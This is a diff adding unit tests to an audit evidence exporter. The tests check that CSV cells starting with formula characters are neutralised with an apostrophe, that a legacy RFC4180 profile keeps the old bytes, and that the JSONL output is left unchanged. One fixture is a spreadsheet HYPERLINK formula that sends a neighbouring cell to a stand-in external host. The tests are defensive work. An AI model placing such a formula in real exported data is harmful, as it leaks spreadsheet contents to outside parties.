@@ -7,6 +7,8 @@ import {
   type EvidenceRow,
   StreamDigest,
   buildManifest,
+  DEFAULT_EVIDENCE_CSV_PROFILE,
+  EvidenceCsvProfile,
   evidenceCsvHeader,
   evidenceCsvRow,
   evidenceJsonlRow,
@@ -64,6 +66,7 @@ function manifestFor(hashVersions: readonly number[]) {
     chain: { intact: true, brokenAtEventId: null, reason: null, verified: 1 },
     checkpoints: [],
     artefacts: [artefact],
+    csvProfile: DEFAULT_EVIDENCE_CSV_PROFILE,
   });
 }
 
@@ -93,6 +96,63 @@ describe('the evidence bundle’s rows', () => {
   it('carries the sequence as a string, because JSON has no bigint', () => {
     const json = JSON.parse(evidenceJsonlRow(row)) as Record<string, unknown>;
     expect(json['sequence']).toBe('42');
+  });
+
+  // --- Phase 18: the formula finding Phase 15 recorded and deliberately did not fix -----------
+
+  it('neutralises a formula, which quoting alone never did', () => {
+    // The finding, stated as the attack: a document title or a delete reason reaching a
+    // compliance officer's spreadsheet as a working exfiltration of the row beside it.
+    const attack: EvidenceRow = {
+      ...row,
+      reason: '=HYPERLINK("https://elsewhere.example/"&A1,"Click")',
+    };
+
+    const cell = parseCsvLine(evidenceCsvRow(attack))[10] ?? '';
+
+    expect(cell.startsWith('=')).toBe(false);
+    expect(cell).toBe(`'${attack.reason ?? ''}`);
+  });
+
+  it.each(['=1+1', '+1', '-1', '@SUM(A1)', '\tlead', '\rlead'])(
+    'neutralises a cell beginning %j',
+    (value) => {
+      const cell = parseCsvLine(evidenceCsvRow({ ...row, reason: value }))[10] ?? '';
+      expect(cell).toBe(`'${value}`);
+    },
+  );
+
+  it('reproduces the pre-Phase-18 bytes under the RFC4180 profile', () => {
+    // The reason the old profile is kept rather than deleted: an auditor holding a bundle
+    // produced before the change has a manifest whose artefact digest is over *these* bytes.
+    const attack: EvidenceRow = { ...row, reason: '=1+1' };
+
+    const cell = parseCsvLine(evidenceCsvRow(attack, EvidenceCsvProfile.RFC4180))[10] ?? '';
+
+    expect(cell).toBe('=1+1');
+  });
+
+  it('leaves the JSONL untouched under both profiles', () => {
+    // A JSON string is data to every reader of one, and an apostrophe here would corrupt the
+    // value an automated verifier compares against the trail.
+    const attack: EvidenceRow = { ...row, reason: '=1+1' };
+    const json = JSON.parse(evidenceJsonlRow(attack)) as Record<string, unknown>;
+
+    expect(json['reason']).toBe('=1+1');
+  });
+
+  it('states the profile on the manifest, so a differing digest has an explanation', () => {
+    const manifest = manifestFor([2]);
+
+    expect(manifest.manifestVersion).toBe(2);
+    expect(manifest.csvProfile).toBe(DEFAULT_EVIDENCE_CSV_PROFILE);
+  });
+
+  it('does not change what a row’s hash attests', () => {
+    // The property that makes this a rendering change rather than an evidence change: a row's
+    // digest is over the audit row's own fields, never over the CSV.
+    expect(manifestFor([2]).attests).toEqual(manifestFor([2]).attests);
+    expect(manifestFor([1]).attests[0]?.chainHashVersion).toBe(1);
   });
 });
 
